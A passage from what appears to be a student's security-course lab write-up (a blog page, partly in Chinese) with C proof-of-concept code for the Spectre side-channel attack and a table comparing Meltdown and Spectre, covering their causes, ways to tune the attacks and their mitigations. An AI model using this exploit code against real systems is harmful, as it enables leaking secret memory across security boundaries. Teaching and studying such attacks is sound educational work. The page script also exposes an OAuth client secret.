time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    restrictedAccess(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;  &#125;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">                                                                                                                                          <span class="number">38</span>,<span class="number">1</span>          <span class="number">55</span>%   s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint8_t</span> s;</span><br><span class="line"><span class="keyword">for</span>(cnt=<span class="number">0</span>;cnt&lt;<span class="number">8</span>;cnt++)&#123;</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(&amp;secret[cnt] - (<span class="type">char</span>*)buffer);</span><br><span class="line"></span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="comment">//printf(&quot;*****\n&quot;);  // This seemly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">    spectreAttack(index_beyond);</span><br><span class="line">    usleep(<span class="number">10</span>);</span><br><span class="line">    reloadSideChannelImproved();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(scores[max] &lt; scores[i]) max = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The secret value[%d] is %d(%c)\n&quot;</span>,cnt, max, max);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结一下两个实验的异同</p>
+<table>
+<thead>
+<tr>
+<th>角度</th>
+<th>meltdown</th>
+<th>spectre</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生原因</td>
+<td>CPU乱序执行，在权限检查时首先会把对应地址以及加载到CPU_CACHE中之后再检查权限。在检查权限之后没有清除CPU_buffer，导致可以测信道攻击。</td>
+<td>CPU在分支预测时发生乱序执行。提前加载了判断语句后面的内容。</td>
+</tr>
+<tr>
+<td>触发条件</td>
+<td>访问不可读的内核部分数据</td>
+<td>在进程内，访问不可读的沙箱中的数据</td>
+</tr>
+<tr>
+<td>优化方法(增大成功率)</td>
+<td>1.使用汇编代码占用ALU<br>2.提前将数据读取CPU_cache<br>3.统计方法</td>
+<td>1.把参与比较的内容提前从buffer里面flush，加大比较时间。<br>2.训练CPU在每次分支预测时选择我们期望的path，达到一种类似欺骗的效果。<br>3.统计方法</td>
+</tr>
+<tr>
+<td>攻击效果</td>
+<td>访问不可读数据</td>
+<td>(同)</td>
+</tr>
+<tr>
+<td>修复方案</td>
+<td>1. 采用lfence，使得在完成某一条指令之前，不可进行乱序执行<br>2.完全禁止乱序执行(开销较大)或者在部分地方告诉CPU只能串行执行<br>3.降低CPU提供的时钟接口返回值的准确性(只需要在高精度下模糊就可以)从而难以进行测信道攻击。</td>
+<td>(同)</td>
+</tr>
+</tbody></table>
+<p>这次的两个非常著名的漏洞，教会了我一些硬件方面的漏洞挖掘方法，以及测信道攻击思路。受益良多。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/04/07/software-security-lab2/">software-security-lab2</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-04-07, 16:38:21</p>
+        <p><span>最后更新:</span>2022-04-25, 17:17:26</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/04/07/software-security-lab2/" title="software-security-lab2">https://nicholas-wei.github.io/2022/04/07/software-security-lab2/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://nicholas-wei.github.io/2022/04/07/software-security-lab2/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/04/14/input_check_lab/">
+                    software-security-lab3
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/04/07/matlab-2/">
+                    matlab-2
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#meltdown"><span class="toc-number">1.</span> <span class="toc-text">meltdown</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#task1"><span class="toc-number">1.1.</span> <span class="toc-text">task1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task2"><span class="toc-number">1.2.</span> <span class="toc-text">task2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task3"><span class="toc-number">1.3.</span> <span class="toc-text">task3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task4"><span class="toc-number">1.4.</span> <span class="toc-text">task4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task5"><span class="toc-number">1.5.</span> <span class="toc-text">task5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task6"><span class="toc-number">1.6.</span> <span class="toc-text">task6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task7-1"><span class="toc-number">1.7.</span> <span class="toc-text">task7.1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task7-2"><span class="toc-number">1.8.</span> <span class="toc-text">task7.2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task7-3-asm-problem"><span class="toc-number">1.9.</span> <span class="toc-text">task7.3 asm problem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task8"><span class="toc-number">1.10.</span> <span class="toc-text">task8</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#spectre"><span class="toc-number">2.</span> <span class="toc-text">spectre</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#task3-1"><span class="toc-number">2.1.</span> <span class="toc-text">task3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8Aflush-size"><span class="toc-number">2.1.1.</span> <span class="toc-text">注释flush_size</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#replace-with-i-20"><span class="toc-number">2.1.2.</span> <span class="toc-text">replace with (i+20)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task4-1"><span class="toc-number">2.2.</span> <span class="toc-text">task4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task5-1"><span class="toc-number">2.3.</span> <span class="toc-text">task5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem1"><span class="toc-number">2.3.1.</span> <span class="toc-text">problem1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#problem2"><span class="toc-number">2.3.2.</span> <span class="toc-text">problem2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#problem3-USLEEP"><span class="toc-number">2.3.3.</span> <span class="toc-text">problem3 USLEEP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#task6-1"><span class="toc-number">2.4.</span> <span class="toc-text">task6</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"software-security-lab2　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/04/14/input_check_lab/" title="上一篇: software-security-lab3">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/04/07/matlab-2/" title="下一篇: matlab-2">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
